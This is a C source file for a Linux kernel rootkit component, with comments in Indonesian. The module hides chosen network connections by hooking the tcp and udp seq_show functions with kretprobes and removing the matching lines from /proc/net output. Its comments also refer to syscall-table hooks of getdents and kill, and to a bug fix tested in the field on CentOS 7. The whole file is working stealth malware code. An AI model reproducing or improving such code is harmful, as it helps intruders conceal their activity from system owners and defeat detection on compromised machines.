/*
 * hook_seq.c (legacy) — hide KONEKSI dari /proc/net/{tcp,udp}{,6}.
 *
 * Pilihan teknik: KRETPROSE pada *_seq_show (bukan patch struct seq_ops
 * via CR0). Alasan jujur:
 *   - kretprobe tersedia sejak2.6.19 -> aman di seluruh rentang target
 *   - patch seq_ops butuh menebak nama symbol struct per versi
 *     (tcp4_seq_ops / tcp_seq_ops / udp_seq_ops...) -> rawan salah
 *   - untuk GETDENTS & KILL kita TETAP memakai gaya era lama
 *     (sys_call_table) — lihat hooks.c. Hybrid = pilihan teknis terbaik.
 *
 * Logika filter identik dengan modern_5x_6x.
 */
#include <linux/kprobes.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include <linux/printk.h>
#include "kver.h"
#include "l4x.h"

/* kretprobe baru ada di2.6.19 — di bawah itu fitur ini nonaktif */
#if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,19)
int  l4x_seq_init(void)  { return -ENOSYS; }
void l4x_seq_exit(void)  { }
#else

struct l4x_seq_save {
	struct seq_file *m;
};

static bool hex4(const char *p, const char *end, unsigned int *out)
{
	unsigned int v = 0;
	int i;

	if (p + 4 > end)
		return false;
	for (i = 0; i < 4; i++) {
		char c = p[i];

		v <<= 4;
		if (c >= '0' && c <= '9')
			v |= c - '0';
		else if (c >= 'a' && c <= 'f')
			v |= c - 'a' + 10;
		else if (c >= 'A' && c <= 'F')
			v |= c - 'A' + 10;
		else
			return false;
	}
	*out = v;
	return true;
}

static const char *next_colon(const char *p, const char *end)
{
	while (p < end && *p != ':')
		p++;
	return p < end ? p : NULL;
}

static int seq_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	((struct l4x_seq_save *)ri->data)->m = (struct seq_file *)regs->di;
	return 0;
}

static int seq_post(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct l4x_seq_save *s = (struct l4x_seq_save *)ri->data;
	char *buf, *row, *end;
	const char *c1, *c2, *c3;
	unsigned int port;

	(void)regs;
	if (!s->m || !s->m->buf || !s->m->count || !l4x_any_ports())
		return 0;
	buf = s->m->buf;
	end = buf + s->m->count;

	/*
	 * PERBAIKAN BUG LAPANGAN (terbukti di CentOS7):
	 * seq_read MENUMPUK banyak baris dalam satu buffer — loop "Fill"
	 * memanggil show() berkali-kali, masing-masing MENAMBAH di akhir
	 * buffer. Jadi:
	 *   - yang baru selesai ditulis = baris TERAKHIR (bukan buf[0]!)
	 *   - kalau ketemu target, buang HANYA baris itu — jangan count=0
	 *     (dulu: port dibaca dari baris pertama buffer -> tak pernah
	 *      cocok, dan count=0 ikut menghapus semua baris lain).
	 */
	if (end[-1] != '\n')
		return 0;      /* baris belum utuh (overflow) — biarkan kernel */
	row = end - 1;        /* titik '\n' penutup baris terakhir */
	while (row > buf && row[-1] != '\n')
		row--;         /* mundur ke awal baris terakhir */

	c1 = next_colon(row, end);
	if (!c1)
		return 0;
	c2 = next_colon(c1 + 1, end);
	if (!c2 || !hex4(c2 + 1, end, &port))
		return 0;
	if (port <= 0xffff && l4x_is_hidden_port((u16)port)) {
		s->m->count = row - buf;   /* buang hanya baris ini */
		return 0;
	}
	c3 = next_colon(c2 + 1, end);
	if (c3 && hex4(c3 + 1, end, &port) &&
	    port <= 0xffff && l4x_is_hidden_port((u16)port))
		s->m->count = row - buf;
	return 0;
}

static struct kretprobe rp_seq[4];
static const char *const rp_seq_syms[4] = {
	"tcp4_seq_show", "tcp6_seq_show",
	"udp4_seq_show", "udp6_seq_show",
};

int l4x_seq_init(void)
{
	int i, ret, got = 0;

	for (i = 0; i < 4; i++) {
		memset(&rp_seq[i], 0, sizeof(rp_seq[i]));
		rp_seq[i].kp.symbol_name = rp_seq_syms[i];
		rp_seq[i].handler = seq_post;
		rp_seq[i].entry_handler = seq_entry;
		rp_seq[i].data_size = sizeof(struct l4x_seq_save);
		rp_seq[i].maxactive = 16;
		ret = register_kretprobe(&rp_seq[i]);
		if (ret == 0)
			got++;
	}
	if (!got)
		return -ENOENT;
	if (got < 4)
		pr_warn("l4x: conn-hide hanya %d/4 simbol terpasang\n", got);
	pr_info("l4x: hook conn-hide aktif (%d/4 seq_show)\n", got);
	return 0;
}

void l4x_seq_exit(void)
{
	int i;

	for (i = 0; i < 4; i++)
		unregister_kretprobe(&rp_seq[i]);
}

#endif /* LINUX_VERSION_CODE >=2.6.19 */
